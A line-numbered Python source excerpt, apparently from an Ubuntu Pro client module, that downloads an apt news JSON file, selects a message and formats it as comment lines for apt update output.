   202	def fetch_aptnews_json(cfg: UAConfig):
   203	    os.makedirs(defaults.APT_NEWS_PATH, exist_ok=True)
   204	    shutil.chown(defaults.APT_NEWS_PATH, user="_apt")
   205	
   206	    acq = apt_pkg.Acquire()
   207	    apt_news_file = apt_pkg.AcquireFile(
   208	        acq, cfg.apt_news_url, hash="", destdir=defaults.APT_NEWS_PATH
   209	    )
   210	    acq.run()
   211	    apt_news_contents = system.load_file(apt_news_file.destfile)
   212	    return json.loads(
   213	        apt_news_contents,
   214	        cls=util.DatetimeAwareJSONDecoder,
   215	    )
   216	
   217	
   218	def fetch_and_process_apt_news(cfg: UAConfig) -> Optional[str]:
   219	    news_dict = fetch_aptnews_json(cfg)
   220	    msg = select_message(cfg, news_dict.get("messages", []))
   221	    LOG.debug("using msg: %r", msg)
   222	    if msg is not None:
   223	        return "\n".join(msg.lines)
   224	    return None
   265	def format_news_for_apt_update(news: str) -> str:
   266	    result = "#\n"
   267	    for line in news.split("\n"):
   268	        result += "# {}\n".format(line)
   269	    result += "#\n"
   270	    return result
   271	
   272	
   273	def update_apt_news(cfg: UAConfig):
   274	    try:
   275	        news = local_apt_news(cfg)
   276	        if not news:
   277	            news = fetch_and_process_apt_news(cfg)
   278	        if news:
   279	            state_files.apt_news_raw_file.write(news)
   280	            apt_update_formatted_news = format_news_for_apt_update(news)
   281	            state_files.apt_news_contents_file.write(apt_update_formatted_news)
   282	        else:
   283	            state_files.apt_news_contents_file.delete()
   284	            state_files.apt_news_raw_file.delete()
   285	    except Exception as e:
   286	        LOG.debug("something went wrong while processing apt_news: %r", e)
   287	        state_files.apt_news_contents_file.delete()
   288	        state_files.apt_news_raw_file.delete()
